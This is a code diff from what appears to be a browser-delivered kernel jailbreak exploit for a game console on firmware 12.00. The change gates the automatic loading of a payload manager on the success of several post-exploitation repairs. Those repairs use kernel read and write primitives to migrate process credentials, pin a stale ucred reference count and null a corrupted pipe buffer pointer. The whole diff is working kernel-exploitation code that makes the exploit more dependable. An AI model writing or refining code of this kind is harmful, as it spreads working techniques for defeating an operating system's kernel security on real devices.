@@ -4315,11 +4315,12 @@
         // loader whose payload_args ABI 12.00 does not use. We serve the payloads ourselves
         // and run the contract poops proved on this firmware, so there is one path.
         await stage_load_elf_via_kexp_shellcode(S);
-        await autoload_payload_manager();
 
+        let post_jb_payload_safe = true;
         try {
             const B = S.proc_ucred;
             if (B === 0n || (B >> 48n) !== 0xFFFFn) {
+                post_jb_payload_safe = false;
                 await ulog("post-jb migrate: B invalid, skip");
             } else {
 
@@ -4337,6 +4338,9 @@
                         migrated_creds.add(toHex(fcred));
                         fd_migrated++;
                     }
+                } else {
+                    post_jb_payload_safe = false;
+                    await ulog("post-jb migrate: invalid fd table size " + nfiles);
                 }
                 await ulog("post-jb migrate: " + fd_migrated + " fds f_cred -> B " +
                     "(" + migrated_creds.size + " distinct cred kptrs replaced)");
@@ -4350,6 +4354,7 @@
                     while (td !== 0n && (td >> 48n) === 0xFFFFn && walked < 500) {
                         walked++;
                         if (S.kread64(td + 0x08n) !== S.curproc) {
+                            post_jb_payload_safe = false;
                             await ulog("post-jb migrate: td_proc mismatch, abort thread walk");
                             break;
                         }
@@ -4378,6 +4383,7 @@
                 }
             }
         } catch (e) {
+            post_jb_payload_safe = false;
             await ulog("post-jb migrate: failed: " + e.message +
                 " (jailbreak unaffected, close-KP may still fire)");
         }
@@ -4386,10 +4392,13 @@
             const A = S.ucred_A || 0n;
             const B = S.proc_ucred;
             if (A === 0n || (A >> 48n) !== 0xFFFFn) {
+                post_jb_payload_safe = false;
                 await ulog("post-jb pin: A invalid (" + toHex(A) + "), skip");
             } else if (B === 0n || (B >> 48n) !== 0xFFFFn) {
+                post_jb_payload_safe = false;
                 await ulog("post-jb pin: B invalid (" + toHex(B) + "), skip");
             } else if (A === B) {
+                post_jb_payload_safe = false;
                 await ulog("post-jb pin: A == B (unexpected), skip");
             } else {
                 const PIN_REFS = 0x10000000;
@@ -4407,12 +4416,14 @@
                         toHex(old_A_ref) + " -> 0x" + PIN_REFS.toString(16) +
                         " (stale freelist consumers now see safe ucred)");
                 } else {
+                    post_jb_payload_safe = false;
                     await ulog("post-jb pin: VERIFY FAILED, cr_ref(A)=" +
                         toHex(new_A_ref) + " (expected 0x" +
                         PIN_REFS.toString(16) + ")");
                 }
             }
         } catch (e) {
+            post_jb_payload_safe = false;
             await ulog("post-jb pin: failed: " + e.message +
                 " (jailbreak unaffected, close-KP may still fire)");
         }
@@ -4420,16 +4431,34 @@
         try {
             const buf_before = S.kread64(S.master_pipe_data + 0x10n);
             S.kwrite64(S.master_pipe_data + 0x10n, 0n);
-            await ulog("post-jb: master.pipe_buffer.buffer NULL'd " +
-                "(was " + toHex(buf_before) + " = victim_pipe_data, " +
-                "kernel free-path will now skip vm_map_remove)");
+            const buf_after = S.kread64(S.master_pipe_data + 0x10n);
+            if (buf_after !== 0n) {
+                post_jb_payload_safe = false;
+                await ulog("post-jb: pipe_buffer NULL verify failed, read " +
+                    toHex(buf_after));
+            } else {
+                await ulog("post-jb: master.pipe_buffer.buffer NULL'd " +
+                    "(was " + toHex(buf_before) + " = victim_pipe_data, " +
+                    "kernel free-path will now skip vm_map_remove)");
+            }
         } catch (e) {
+            post_jb_payload_safe = false;
             await ulog("post-jb: pipe_buffer restore failed: " + e.message +
                 " (jailbreak unaffected)");
         }
 
         pin_to_core(S.orig_main_core);
         await ulog("restored main thread to core " + S.orig_main_core);
+
+        // Only touch new sockets after credential migration, stale-ucred pinning,
+        // pipe_buffer neutralization, and scheduler restoration have all had a chance
+        // to complete. Delivery failure remains non-fatal and leaves the menu available.
+        if (post_jb_payload_safe) {
+            await autoload_payload_manager();
+        } else {
+            await ulog("autoload: skipped because a post-jailbreak safety repair failed");
+            send_notification("Jailbreak complete\nPayload Manager skipped\nSafety repair failed");
+        }
 
         await ulog("=== p2jb complete ===");
 
